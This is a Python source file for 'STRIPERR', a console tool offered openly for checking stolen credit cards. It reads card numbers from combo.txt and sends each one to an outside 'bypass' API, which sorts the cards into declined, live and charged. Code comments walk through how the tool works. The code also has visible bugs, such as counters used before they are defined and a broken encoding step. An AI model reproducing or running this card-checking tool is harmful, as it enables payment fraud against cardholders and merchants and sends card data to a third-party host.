import os
from urllib import request
import colorama
import requests
import time
from colorama import *
import ctypes
from os import system





# made this code in 30 minutes lol, python ez
# sub to https://www.youtube.com/channel/UCVFNSgZJwSOimteCjyEZD5A
# made by knq#0666 and Finx#0007







title = ctypes.windll.kernel32.SetConsoleTitleW("                                        STRIPERR ~ Made by knq#0666 & Finx#0007 ~ Declined: " + (str(declinedccs)) + " ~ CCN / CVV: " + (str(ccncvv)) + " ~ Charged: " + (str(charged)))

# we do this title thing so we dont flood vs code lol, its pretty much a shortcut for the command

# these are the counters, we will use these to count the declined ccs, live ccs and charged ones

declinedccs = 0
ccncvv = 0
charged = 0



os.system('cls')

# change the logo if u want, but keep the credits

logo = '''


                  ███████╗████████╗██████╗ ██╗██████╗ ███████╗██████╗ ██████╗ 
                  ██╔════╝╚══██╔══╝██╔══██╗██║██╔══██╗██╔════╝██╔══██╗██╔══██╗
                  ███████╗   ██║   ██████╔╝██║██████╔╝█████╗  ██████╔╝██████╔╝
                  ╚════██║   ██║   ██╔══██╗██║██╔═══╝ ██╔══╝  ██╔══██╗██╔══██╗
                  ███████║   ██║   ██║  ██║██║██║     ███████╗██║  ██║██║  ██║
                  ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
                             Made with <3 by knq#0666 & Finx#0007


'''


def main():

    # this is the main gui

    title
    print(Fore.BLUE + logo)
    print(Fore.BLUE + '                             [1] CHARGED CC CHECKER [ NO SK KEY ]')
    print('')
    print('')
    module = input('                                           [>] ')
    if module == ('1'):
        os.system('cls')
        print(logo)
        print(Fore.RED + '                          [!] REMEMBER TO PUT YOUR CCS IN combo.txt')
        print(Fore.RED + '                          [!] REMEMBER TO PUT YOUR CCS IN combo.txt')
        print(Fore.RED + '                          [!] REMEMBER TO PUT YOUR CCS IN combo.txt')
        time.sleep(3) 
        os.system('cls')
        print(logo)
        def check1():


          # and here starts the checking

          # we made new function, we have to do global (counter) or we arent able to use it

          global declinedccs
          global ccncvv
          global charged

          ctypes.windll.kernel32.SetConsoleTitleW("                                        STRIPERR ~ Made by knq#0666 & Finx#0007 ~ Declined: " + (str(declinedccs)) + " ~ CCN / CVV: " + (str(ccncvv)) + " ~ Charged: " + (str(charged)))

          import requests
          with open("combo.txt","r")as f:
            combo = f.readlines()

          for items in combo:

            # here we modify the combo file a bit, so that every cc is a different line
            # the %7C is because the api is url-encoded, which means that some characters get turned in to things like that ( from | to %7C)

            cc = items.replace("|","%7C")
            cc = items.replace("\n","")
            r = requests.get('https://znetbypass.live/ZneT/api.php?lista=' + cc)

           # r.text is the response from the api

            if r.text.startswith("#DIE"):

              # ^ if the api response code returned the cc was declined we will write in console
              # that the cc is declined, same works for ccn/cvv and charged

              print(Fore.RED + '[-] Declined - ' + (str(cc)))
              declinedccs = declinedccs + 1
              title
            if r.text.startswith("#LIVE"):
              print(Fore.YELLOW + '[+] CCN/CVV - ' + (str(cc)))
              ccncvv = ccncvv + 1
              title
            if 'CHARGED' in r.text:
              print(Fore.YELLOW + '[=] CHARGED - ' + (str(cc)))
              charged = charged + 1
              title
                       
        
        check1()
        
        # this is checking results, pretty ez nothing to explain

        # (str(declinedccs)) means we just turn the counter into a string so we can print it

        title
        print(Fore.RED + '[!] Checking results:')
        print('\n')
        print(Fore.RED + '[-] Declined CCS: ' + (str(declinedccs)))
        print(Fore.GREEN + '[+] CCN / CVV: ' + (str(ccncvv)))
        print(Fore.YELLOW + '[=] Charged CCS: ' + (str(charged)))
        print('')
        return1 = input(Fore.CYAN + '[/] Press any key to return to main menu')
        return main()


main()

# knq#0666 and Finx#0007
